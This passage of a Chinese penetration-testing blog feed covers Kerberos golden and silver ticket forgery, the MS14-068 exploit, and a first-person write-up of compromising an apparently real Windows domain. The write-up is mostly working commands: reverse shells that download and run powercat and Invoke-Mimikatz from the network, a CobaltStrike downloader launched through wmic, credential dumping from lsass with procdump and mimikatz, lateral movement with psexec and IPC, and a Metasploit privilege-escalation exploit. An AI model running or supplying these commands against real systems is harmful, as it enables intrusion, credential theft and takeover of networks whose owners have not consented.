src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/16.png" alt="" loading="lazy"></p><h5 id="Metasploit"><a href="#Metasploit" class="headerlink" title="Metasploit"></a><strong>Metasploit</strong></h5><p>msf制作金票</p><pre><code>load kiwi</code></pre><p>生成Golden Ticket</p><pre><code>golden_ticket_create -d fanxing.com -k 8b3955c065502e33716d555d4421a723 -s S-1-5-21-3408186607-3793295459-3581146574 -u fanxing -t /tmp/golden.ticket</code></pre><p>将票据导入内存中</p><pre><code>kerberos_ticket_use /tmp/golden.ticket</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/17.png" alt="" loading="lazy"></p><p>dir访问目录成功</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/18.png" alt="" loading="lazy"></p><p>金票的创建，需要krbtgt的密码ntml hash，对于防御，只要定期的修改krbtgt的密码，就能使金票失效。</p><h4 id="白银票据"><a href="#白银票据" class="headerlink" title="白银票据"></a><strong>白银票据</strong></h4><p>白银票据是TGS颁发给Client的ST票据，根据kerberos协议第5步，Server会对Clinet的ST票据利用Client的hash解密，所以这个过程不需要经过KDC，而且只能访问Server的服务一次。</p><p>满足一下条件，即可以伪造银票：</p><p>1.域的名称</p><p>2.域的SID值</p><p>3.域服务的NTML Hash</p><p>4.要伪造的用户名</p><p>5.目标服务器的kerberos服务</p><p>常用的服务名有</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/19.png" alt="" loading="lazy"></p><p>伪造银票</p><pre><code>kerberos::golden /domain:fanxing.com /sid:S-1-5-21-3408186607-3793295459-3581146574 /target:WIN-M34UCFJIPNQ.fanxing.com /service:cifs /rc4:dcd87fc42d9d8ac03dec5931a55ddd59 /user:fanxing /ptt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/20.png" alt="" loading="lazy"></p><p>对于银票的防御措施可以开启PAC，PAC只能KDC制作和查看，在注册表中添加一个ValidateKdcPacSignature为1</p><pre><code>HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/21.png" alt="" loading="lazy"></p><h4 id="MS14-068"><a href="#MS14-068" class="headerlink" title="MS14-068"></a><strong>MS14-068</strong></h4><p>Client向AS申请一张不包含PAC的TGT票据，会伪造一个PAC，在TGS_REP中，对伪造的PAC验证成功后，会返回一个新的TGT票据。</p><p>通过<a href="https://github.com/abatchy17/Window**ploits/tree/master/MS14-068" target="_blank" rel="noopener">MS14-068exp</a>利用</p><pre><code>MS14-068.exe -u 当前域用户@域名称 -p 当前域用户密码 -s sid值 -d 域控ip</code></pre><p>sid值通过whoami /all获取</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/22.png" alt="" loading="lazy"></p><p>然后会在目录下生成一个证书，利用mimikatz</p><pre><code>kerberos::ptc C:\wwwroot\TGT_xxxxx@fanxing.com.ccache</code></pre><p>就可以使用dir访问到域控的目录</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/%E9%BB%84%E9%93%B614/23.png" alt="" loading="lazy"></p><p>对于ms14-068的防御可以打补丁KB3011780和使用winserver2012</p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p>1.<a href="https://www.anquanke.com/member/143805" target="_blank" rel="noopener">https://www.anquanke.com/member/143805</a></p><p>2.<a href="https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/" target="_blank" rel="noopener">https://1sparrow.com/2018/02/19/%E5%9F%9F%E6%B8%97%E9%80%8F%E7%9B%B8%E5%85%B3/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;NTML协议&quot;&gt;&lt;a href=&quot;#NTML协议&quot; class=&quot;headerlink&quot; title=&quot;NTML协议&quot;&gt;&lt;/a&gt;&lt;strong&gt;NTML协议&lt;/strong&gt;&lt;/h4&gt;&lt;p&gt;在工作组中，密码hash保存在本地的SAM文件中(%SystemRoot%
      
    
    </summary>
    
    
    
      <category term="内网渗透" scheme="http://yoursite.com/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
  </entry>
  
  <entry>
    <title>我的一次内网域渗透实战</title>
    <link href="http://yoursite.com/2019/08/14/%E6%88%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/"/>
    <id>http://yoursite.com/2019/08/14/%E6%88%91%E7%9A%84%E4%B8%80%E6%AC%A1%E5%86%85%E7%BD%91%E5%9F%9F%E6%B8%97%E9%80%8F%E5%AE%9E%E6%88%98/</id>
    <published>2019-08-14T09:34:05.000Z</published>
    <updated>2020-04-29T07:16:59.297Z</updated>
    
    <content type="html"><![CDATA[<h4 id="CobaltStrike反弹shell"><a href="#CobaltStrike反弹shell" class="headerlink" title="CobaltStrike反弹shell"></a><strong>CobaltStrike反弹shell</strong></h4><p>通过CNVD-C-2019-48814获取到shell，由于这个网站存在ETES杀毒软件，写入jsp木马或者利用vbs，certutil，powershell下载msf木马均会被杀，这里可以利用powershell反弹shell的形式在自己的vps上获取到一个shell。具体这个漏洞怎么利用我不说了，网上很多复现文章。<br>在cobaltstrike生成一段powershell代码，插入payload</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/1.png" alt="" loading="lazy"></p><p>执行payload就会在cs上获取到一个会话</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/2.png" alt="" loading="lazy"></p><p>将cobaltstrike上的会话移到metasploit上(怎么移植，网上有很多教程)<br>在metasploit上接收到shell</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/3.png" alt="" loading="lazy"></p><h4 id="内网信息收集"><a href="#内网信息收集" class="headerlink" title="内网信息收集"></a><strong>内网信息收集</strong></h4><p>查询域名称：net view /domain<br>查询域内计算机：net view /doamin:xx<br>查询域控制器时间：net time /domain<br>查询域管理用户：net group “domain admins” /domain<br>得到域控制主机名：net group “domain controllers” /domain<br>…..<br>获取域控主机名：net group “domain controllers” /domain</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/4.png" alt="" loading="lazy"></p><p>通过ping主机名获取域控ip地址</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/5.png" alt="" loading="lazy"></p><p>补丁情况：systeminfo</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/6.png" alt="" loading="lazy"></p><p>MS14-068打了补丁，无奈只能上mimikatz读取密码，但是有eset杀毒软件，一上传就被杀了，有没有免杀的mimikatz，幸好powershell没被拦截，通过Invoke-Mimikatz读取密码。</p><p>本地nc监听本地35602端口：</p><pre class=" language-shell"><code class="language-shell">nc -lvvp 35602</code></pre><p>在burpsuite上执行powercat反弹shell</p><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token function">New-Object</span> System<span class="token punctuation">.</span>Net<span class="token punctuation">.</span>Webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>DownloadString<span class="token punctuation">(</span><span class="token string">'https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>powercat <span class="token operator">-</span>c ip地址 <span class="token operator">-</span>p 端口 <span class="token operator">-</span>e cmd</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/7.png" alt="" loading="lazy"></p><p>Invoke-Mimikatz读取密码</p><pre class=" language-powershell"><code class="language-powershell">powershell <span class="token string">"IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds"</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/8.png" alt="" loading="lazy"></p><p>成功读取到域控的管理员账号密码</p><h4 id="拿下其他主机"><a href="#拿下其他主机" class="headerlink" title="拿下其他主机"></a><strong>拿下其他主机</strong></h4><p>有了域控账号密码，ip地址，就可以连接域控了，这里有很多种方法(ipc，wmic，p**ec，sc等等，这里我详细介绍3种方法)</p><h5 id="1-IPC连接"><a href="#1-IPC连接" class="headerlink" title="1.IPC连接"></a>1.IPC连接</h5><p>net use \ip地址\ipc$ 密码 /user:域控主机名\域控管理名<br>将文件copy到其他服务器上：copy 1.bat \ip地址\c$<br>获取服务器的时间：net time \ip地址<br>设置1.bat执行时间：at \ip地址 获取到的服务器时间 执行文件<br>删除ipc记录：net use \ip\ipc$ /del</p><h5 id="2-wmic"><a href="#2-wmic" class="headerlink" title="2.wmic"></a>2.wmic</h5><pre><code>wmic /node:ip地址 /user:用户名 /password:密码 process call create cmd.exe</code></pre><h5 id="3-psexec"><a href="#3-psexec" class="headerlink" title="3.psexec"></a>3.psexec</h5><pre><code>psexec \\ip地址 -u 用户名 -p 密码 cmd</code></pre><p>这里我通过wmic来连接，由于wmic没有回显</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/9.png" alt="" loading="lazy"></p><p>可以执行powershell反弹到cobaltstrike上，在移植到msf上面</p><pre class=" language-powershell"><code class="language-powershell">wmic <span class="token operator">/</span>node:ip地址 <span class="token operator">/</span>user:用户 <span class="token operator">/</span>password:密码 <span class="token keyword">process</span> call create <span class="token string">"cmd.exe /c powershell.exe -nop -w hidden -c \"</span><span class="token function">IEX</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">new-object</span> net<span class="token punctuation">.</span>webclient<span class="token punctuation">)</span><span class="token punctuation">.</span>downloadstring<span class="token punctuation">(</span><span class="token string">'cs上生成的url'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>\<span class="token string">""</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/10.png" alt="" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/11.png" alt="" loading="lazy"></p><p>在域控中进行下信息收集，获取域成员机器</p><pre><code>查询所有域控制器：dsquery server查询域内计算机：dsquery computer查询域用户：dsquery user查询域用户所在域组：net user 域账号 /domain查询域组所包含的用户：net group 域组名 /domain</code></pre><p>先获取域内计算机名</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/12.png" alt="" loading="lazy"></p><p>通过PING获取域成员主机的ip地址，然后再用域管理wmic进行连接反弹shell，获取的ip如下(没包括域控和存在web漏洞的ip)</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/13.png" alt="" loading="lazy"></p><p>cobaltstrike上线0.4和0.7的主机</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/14.png" alt="" loading="lazy"></p><p>在对0.11主机进行连接时，ipc出现了错误代码86，指定的网络密码不正确。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/15.png" alt="" loading="lazy"></p><p>应该是域管理限制了这个域用户登录这台主机，要其他域用户可能会登录，由于要system权限才可以利用mimikatz抓取密码，所以这里需要提权。</p><h4 id="域控提权"><a href="#域控提权" class="headerlink" title="域控提权"></a><strong>域控提权</strong></h4><p>systeninfo先查看下那些补丁<br>批量获取未打那些补丁</p><pre class=" language-cmd"><code class="language-cmd">systeminfo>micropoor.txt&(for %i in ( KB3164038 KB3141780 ... ) do @Type micropoor.txt|@find /i "%i"|| @echo %i you can fuck)&del /f /q /a micropoor.txt</code></pre><p>获取到 KB3164038(ms16-075)补丁没有打，metasploit提供了个exp</p><pre class=" language-shell"><code class="language-shell">use exploit/windows/local/ms16_075_reflection_juicyset payload windows/meterpreter/reverse_tcpset session 2set lhost ip地址set lport  端口</code></pre><p>成功提到system权限，可以利用mimikatz读取密码了。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/16.png" alt="" loading="lazy"></p><p>由于域控上存在eset杀软，可以通过procdump+mimikatz读取密码<br>先下载procdump到域控上</p><pre class=" language-cmd"><code class="language-cmd">certutil.exe -urlcache -split -f http://xxx.xxx.xxx.xxx/procdump64.exe</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/17.png" alt="" loading="lazy"></p><p>执行：</p><pre class=" language-cmd"><code class="language-cmd">procdump64.exe -accepteula -ma lsass.exe lsass.dmp</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/18.png" alt="" loading="lazy"></p><p>将lsass.dmp下载本地利用mimikatz读取出密码明文(两部操作都需要管理员权限)</p><pre class=" language-cmd"><code class="language-cmd"> download C:/Windows/system32/lsass.dmp</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/19.png" alt="" loading="lazy"></p><p>下载到本地之后，mimikatz执行：</p><pre class=" language-cmd"><code class="language-cmd">mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonPasswords full"  > 1.txt</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/20.png" alt="" loading="lazy"></p><p>读取到5个用户明文，这里我只给一张图吧<br>最后登录0.11那个地址，由于cobaltstrike一直都不上线，我就采用的nc反弹</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/21.png" alt="" loading="lazy"></p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/3333/22.png" alt="" loading="lazy"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;CobaltStrike反弹shell&quot;&gt;&lt;a href=&quot;#CobaltStrike反弹shell&quot; class=&quot;headerlink&quot; title=&quot;CobaltStrike反弹shell&quot;&gt;&lt;/a&gt;&lt;strong&gt;CobaltStrike反弹shell&lt;/
      
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>对学校的某次渗透测试</title>
    <link href="http://yoursite.com/2019/08/07/%E5%AF%B9%E5%AD%A6%E6%A0%A1%E7%9A%84%E6%9F%90%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    <id>http://yoursite.com/2019/08/07/%E5%AF%B9%E5%AD%A6%E6%A0%A1%E7%9A%84%E6%9F%90%E6%AC%A1%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/</id>
    <published>2019-08-07T07:44:45.000Z</published>
    <updated>2020-05-14T07:31:02.519Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="a8c6a40e98316f3a60e3d398b89d99c159b967c09c63cbb9d0ce8b60466ed998">dd9f35a0f7a129882748da09be428af5</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
    
    <summary type="html">
    
      密码：TloveY
    
    </summary>
    
    
    
      <category term="渗透测试" scheme="http://yoursite.com/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
  </entry>
  
  <entry>
    <title>实战渗透测试(一)</title>
    <link href="http://yoursite.com/2019/08/06/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)/"/>
    <id>http://yoursite.com/2019/08/06/%E5%AE%9E%E6%88%98%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95(%E4%B8%80)/</id>
    <published>2019-08-05T16:00:00.000Z</published>
    <updated>2020-05-14T10:13:38.659Z</updated>
    
    <content type="html"><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <div class="hbe-input-container">  <input type="password" id="hbePass" placeholder="" />    <label for="hbePass">输入密码，查看文章</label>    <div class="bottom-line"></div>  </div>  <script id="hbeData" type="hbeData" data-hmacdigest="62e12fd3a0c8e8c64c41e16642bf9753550bdce90032d181ee4404049cf149ef">18d47651770175ba369f96b468a937c1fae81990cd09ae7f10976f586069165c4483d03c6e498ef14fa4d5ae0ef752257dacbc6baf2e25857651cec44e1c01242d3ca13053895409d995d627b75efbb7dbbba4f9f253030de45c462a6ebe7a9f0848bf9e1f5fc90d1844c2bcb9e52227631d59d0ab035dc0b039c567fc5578c445144e57e3dafeb031bba2a0bdf359ed5ab4f5bcdf2b4591968fc43f9912170b1ded31ff33e6167ec9f150da24985fcf78570c4913c2a53f8168fcab5a0e5e8ccc8f8793813e750598f1e9a46d4d5cdb963811e83dffa9fe67788a75c9d07ef5cce617bc250a18489980fc6101efd5f9ca71b7186647399a2478a8b5b6b07bed2552e5cba4424e57c83c028d79e2964d42121f2568062bf115ff9f9eb408f40a723620afd904b726db32fe3628f29ecfdb5d9465ba7c7d06fd2680eea97b9c4c69aa569d8d2390247e7874a49a7003f771d112f22f7d35287c67c7e7a4f5577917211da06f1beded79ed93a91759eb5567a1353f825c6fdb1d61c77ff18466e16c0ea39f848dfeb45b28792ed8218840168a263d9933baad1fe8e4fab66e5f1b7b0d522c2f3681370af0b939af59e8fde7ded75737f6c9ae95469a353e4efe7840868ef3f7a80e3ba2235d0e051d5064897f75cb2938cb5e4a98eb8ad53413e46450af1d54d6be9a0a21c3abdba8ca9517459a722a68eeb3116e7d5da8648eeb36e6ff108b6e372582dd43d71bc7688111ee3e6c4af2278f2e8b13cae6951d11a7f9380517ffc1c6bffc42bb42ebb54c691cfeeb8e9613fa41e82344d9fe742f6ab914a45a4e3e3ee199ea99f0a6ea8dd9fd3f8fbd2f2479a629226199806303fac5b206e382154454f4258a52d32fb973c44b075305002b1de34a276098985c27789626ee01eb8b9b38d9e8f1e99445f0137a340eebd75d20b8d1d8ff62ca6c0da9926d071c4335f336ca8ccd875ef7abfe76748a00332847f8464f98df7eee0e13cd960ddfbfb9af5de3c0467c8d01dcccc4e6239e6bcc17a8f2d6709b7aa44d5a14f61d5ed4a09a8c447dc8163ba3096e5581e6088f8ab1bcf1b6b2116931bf021db3c6f99f57f2ce2a611608883950bf088fb9fcd8d9820f32deeabffb1f305bd80d512f7983a5cb5bb448ec5a3d2dcbdbbdcba3528092509878b7489f737e55eb6070bc97730f7a4183b656d8f848e039dfd37cc91e54bdc969b29d08dc0b114e78bb74db3113d99bf2a89733be913703c5da3151aee1ad9cc4859ac7231c9abd531fac4a80a48cf9d74e4bc9737cbe0d49f3e9da2521429beb991efcf423c79bfcc629212c52532f8aa823f3f19824ce8a8ffbb542be76b47739be28e15259bf22bb3ba5bd8af20c1e104b70e1c5230646e5e3886bd716b2dc4418ee7401271620d3ef2a2896fb8717c4e1a2358fe6d63311f27d26e25516a1e693ae8c798021162b5e24124e567b2c27d4e750e1955db6cf0f09be9bac6bc1fea6e013c3528302f0956a6528858b250adfa73206157765c79a98a21c2bc8240f37ecc6a95bda998d55d8f0bccf213ba3e5bcda5d1a7c53cab435b73c643ad05285c69207abac3dd0f0b8a332b73f43ab502958fb5e9159c60fe1b42f43feb33e2ea041520099d7ddf634d113eb9876f249dce8514e7123e959966dcac45dfaa9ee3b8694e0898ea4b374b2b5c4d64ceab0ee4391e95934549db2326ff9d5af3fed7239cfec8223c6ed9565d5b97ebfa0190415b860f81688d72ec4d6f1c7c1d73838bba9b7ba283e5c76150ec7f5dbcebee3c3b1347d2ff355b383b2eb6379fe67031a3f1ee914b15d8a704bed4a67c19e0dc92a85ea67c523ed06a012875dcbdb09a9f69d93a99c2fc5ce69e7f4428be87985f1bf68f26d7a2d0121d3d3a25cbdc04cbb32d7fd7764f677ca793138b818983e9e324d24e76323a77a7033ddad5d61bc60d598261437b0973369a5881d3e5e0df0c6ea06bac22d86f9290187e4ced889bb0b249e882a82feb67020b85956bcb1b6bc7df7a2cdd0f15be3d978d5fbac2ca5716eec2b0e9437bce735a91ec60855d619c8907420eea0d6d16ed1bcd249af0328c9101e5a97a9f118793508039ab6a5c49149e18d6b67ddb22a03b177f48e98c08f2e462c605f43f1bb939d590324667613c257aae0e2bd209a9dcd8f9addb6bb328fb283f747f546e9d6c6405fa7dba16bd73a371850dca6c1d05b91f8e4dab7f7e88048ab9823327214641e1e5fa422cd6e9c8666c9c85264ff27dafa3e1dec27f250bdd292ee245112562899761be8e6f6e63e726f91fa24d52b84e85c785dc542e953c49852d28263ea16518f1a036e7807fa79821e6a84fc7f3a1b281ffdfe623eeedc1fc4929d7d943229a8c3e9826697594d4697033a0c5f1d008a64cd45e454bdbff3f84fad9d146838c4d66429a77c3a3c103c6fb3cab3a344ca5ca21a0a9464fdd1a346550a3270e7ab5411f392c10ee6108ca39bfa1c30bf9a9789334c36c68f4bbf7d8f8137382fccd9058dd2c63bdb2a15de88cb0b5db8c43d6cb37f75dfdd08169baab35764c5b4794f5d8921adb839e1c50910790d4063785dee89658e31498fa08240a141ff5309a91bc9e678d60fd2d294b78bd7093b6a92f95ed1300cfc45ace0c9cb79e1093363ddbb9e775f4db68754b870762afdb45c8bee2842686c911470a6894296f688b6332f9716364387f339ffb18f6e36d21f81964520d03dca756383ba0d54649826fab4001adadaf8f006345badb998f0795d2819ced213348fe16081fbed19e67e1636991ad532e3a0985addfab9bb6080bd4cde4e34a84d1a70bf96b38bae24b604b1f14d51b782014e0c5f1ea7870518222cd21c1e414ea8a00c4d8d03ac62515f922cd3873806eaf9df4b89ea4364790d5a0e7635dfaf18585a6b984efb891e582a7d7359303ae839f5845407e41c83026d85e1f6d9c4f74b19b3ce66f2bc226e4f6813b5f2c4ae8be4268da8c182fcdc0bba9418e41ce62152dc6e4d7fcd693c1d32f173e8fe3ff74b2c14596140957a3c0310112ff93edbcc794ef1cb8c31f52d905c832e08401c0ea8cbe7ae14a1ff9ae13e05564149a78d4506cc8347211b967a8db182c2cfcb720c9e72e5c33ab3f7a79bcedeeeed2664143a96393e68af43588647a20cef5de24e1f20659eac249c448a8e72ccdc41d61b07b0a112ee42961f09dcc3b347ef3ea43d891a8ae4aef7b7158288c44ab295c55a655652c8a24d276723a1c4d96918e56d6286eb26fe902b7ba45304ef18bde203fa64bce0ae82aef558dece751f9a81f36b4b14b09ba3a0a5ea8ba4914a68a78097a2f08163672bc5fba07c560fff486a761a1fe6c69279f60d13029d27a2c9907a3d571ee0b9f9375c23f80d1a29eab885bb0ba07d654d49bd7924a64fe2f05c3742d25921e7ebff4c7dc10e36328e9d80ca85f13dcfd23f1470c469ec69eb014218eb70fa5c05b87959fc8601f064ba7258277b704fef3e7b453e2968ad39e4acaea426840482709e594a4974ef5492178b6454468c84997155cb0afe87a923e1bc4de18d37cffa99272ef9bd355613a52980c950a52b538db77930959db8723102d6705a4d2d157a040c81391137b9f8fbf5b11793d92294a5b0e71e49b4221aba85a429347f9c765ecc8eee69feddd4badada40530c2e0a6dbde7c08a32a76cd6ebdd6561aed3622fa00697748c9c95683de7b3953d8de52e6619304905188387933fce58b0315c304f02aa03cafb049ffe3853a75a97309ed03c1923bd67d26fb9d43ad98b2d3112c1bb90d27093b83eb3dba4997400e1486fd04831d41dbaa82edec76fe6f987e97e9482d3cc667b6d29aba7cdb6cc5c2ae23f24a2e214ede4ec499b83e815d9dc905f34132112ea9e270fb36cc13d45b87acfaf716b17d31a4049a760d4d129a6f7e28ee5b239001d61970f318202307255e99cd04f24462e9f0eb5bc067dd4575eff7f8336715771324e9aa6dedd08e5d3b8b4f2c0e16494344bca1a920bd6fc877fe81dbc3b623e1ab550bc47870201eb6a9530ac2f4f88097512193e06156dba2dbc4ed204572123c71b967ff78cfbc81f95fc62ae72722cfe5323dd7a31cb755b08bee7833844dd9e5649eef9b2b3761de68f39aa4c2c671d4a3bc35bc709dcbfce2bb496b9a6f6cd4a9b5480a802021f87471ca1f892dd4e694c653eb0d9e3f4996697668bcd02a58a2b7a2dd263b84b0b01f290d412c50fe66f901ceec1a92658f8177b83acafc15e6da5f729ff1acd3a3e9d66d0862e1751bebe8e25088b5a44c5cddae2fb4de7130a5e22ceaa181fa57fdd07e65ab40e0fb5492282b876cf4c2855a5d6bc21e878fd05efe4d78913361200e0bb1b3dfdf625b6cc0ba714a5baf8b1a81742bd9e612b9a8e522bc263bb8edfbfbe01a7a0ae63d20debddb7ccbae7ca4c7ef3cf5bf87fd0f66fc027021a27e85b542a90d3a01a784c7144fb7f27a94f4525ac36c37d7cd6c587bec942f4eb90703c7e111a55e82999b5cccdd2cd43109d1ed79a33b5fb1e818d733e15fdeeadd14eac34aca43a714f3a287caa43e335ff2d37c4cf32d777f6ad77dd5713e193c5a1a78e2708a8f36f76f19c15be0021b60a9e6007e2376a5ac662498ea9eb9bd1f57a608e8fee935e629c4622c98822f82e516826a953514b2284b956633c58b1fe5eef9bf31aca0cd43c9bbc017c69a2588955f12489411b3dd4f3a74d0a2c2342b3d1db8ae6ba728c828f492517a0ede2015b7bfc2c66f1c3a78ba2a254bfa812b465f630c520234f7bd88bc8b4975bbd0de8b4901d4698ae389392a033a2aeb849c671d11dcb6ed985656774f605ac5bdc7ab7fab66b8375c2ca489742e92f3f5b898ace145bb692b912dbf2756e687f1e38689dbd96ba8dd70e2f222579a948322a55751e6a73c92dada6329ef166631313809529f94ab9fab4c162699c9a23884fd8f081697faa894b2293cdeaafa9b73b33613fb02a85891233b8ce79eb28f1189e3c22b699ad11507a1f5efb97d129b18091191e586f5e26744a12e49cce598eb29b59de6eb88ce90505dbdb47733533e561233654421b06c04ce02dc6019dd132e5a693ed420b2bd5bcad27d2c19782d71dfa87d24a3937fbb07755e046d70ce662f00f99dd0a2a8023683366930f1627f33049b22c432596c14bbe666d3688ad4c7fcd0510de95ee073e9c71479e0df14f2c334279bacfc7b3afbeff436dea67d8db2d18b85a6096ef402613662876061f675b6a9bdf4ff472624fc0b967bff78419f6a584c0fb9e4b21276b07beaa9e431489f7e5257a2dd610d59310e5b353041cc110c99bc28ca28139d8acbe8bd2654c32b307c1e3b56421f1149850d6ef213f0f09f2f7ebaed6629e0b342c770c2b7c4350b3d45b755287211f7818cee5cc50a4e10d7f50c85dc53bfd6d3af076f1077d852d601529e578113ec2c9f53af2683bdbf79b9bbf2ecbc6575b7d48f8bd70c2ea15579894725d72be96f03946c181a4c14bd1a99a51b5aee6a08789528fd8107d150e09226cd29f059798007bbbba2bf810b368b162f2992a17999b2b9dd44931b83de60ef9f9b49b25f78fe0b8e2d286591e5361b132e3f1d64863a8a098f5052030e2e4f071c9099a4e1519f0df9accd8f3e4915ae03800764e3d9c80a637c9082fff4a4ec216a00307b7998604da77dd06e7fe3bbd8c7c5fb991b751b140a184ca0f7e1eed0b3d4a6e4c837bba591dcc91516279f49488d033e96fb5c8fa18f515cb83189014ee1c6f2b0a64198be93ccf347bd5a1e9dfec5f5ca08f189cb1d43470aab4da307bae090e5a47e899936b4a9447464b9900f1635758806f5e8353197091ef81fa7ef65a7e322a333a4e3e76ae783f5fb09414425f828dcb4da5c91dc49744c8ca28e21c523fc2d72286bffb2d9dc5ea73977c52b832a19b746d592a196f7c138ea10040f5464843a8ec8f92f97a1b9b0d0f60db101e0d0d4c83aee81b25ea12ef54c3a639f719a5dfe707f84c70432ca09168434967b08db9277787fdea88eed1fab2a30d402a1e9f3e27322b5d39520bb23866bb44ca17989645366d2763af8e298714ef2022f7fced756119505cb8f9b66897ffcdcef4aa3d4ab716f1b28be45f48b2fed1685b8d2d8a671c4054bcb13be52c5076161f95bf93da494d2fececba7258836dde6d33ff471e3a2d0b5a97985606295de52d0a397e3591fb1ace77bb2b115355ddf280900640f718c2eaedf5282a840c095c30e7086c9c67cf1437a462a3467c510a0d9aacfd14b16d0bd75062326c4726ca9f4a6ef4b019dcab2d51b45f02cea061346f79ed9d05cf1dfdd8b8536af7df472fa6d977a3d38a6871bac7d8aeaf26c8f3f9b53d80be9104054da60abd41f2f50b1323e3d13416e9a94a2be8a5e47e8d0a3d08f319190e5f85ffa0ae6853cf51c477f2c0ed8453e113e41a37f15ff8c95564276a075f47693a259adc09452ff1a7491cd418bd3d33e6364480aaaef01064138c12d40ea1045154b132fd1e689f555870c36ffe72d4292533e36e7c32cdc73aac532a91b03032c9ea9ea98d1efaa22e500d549b9f579e0004bad2d988f35d7e5b625760cc6314b0e044cd070e0ebed35731b8ca5edf590e227fcb8c390adf8a9e697af7c7d0fb8e50c9934153f212198abe7f98a87904709d24d2b937fc2068c6f4c3bf0cc550970d3e93c76913cd15274b6ffda903df044964a8c6b0434e711c4d76727225fef48d0f98d1b14e934a4d20ca7c003d526d2f69678e043e92691d39a17e9feef334901e4f1511f8ec62b2e400f3b5b83ceb3217a63508c21578fb60eab30781863aae7d4130cfaf400a495b67cbbd56d0f817bb6aa40c89bb73eea5b6fe22b977359620daa69c00d6b94c1502cc35f04348d5cfd406ec22408e0f699b68d33b43d2d76fa3ede3c197477e52766c28c4b7462b0c14ec20627bbe7053570bc32cd3750b2f3ecafbfe66f6c4a69601308a8b9d2bcc237425c5f7b65aacce49f3c3ae896fb3c6dadbd0d45ae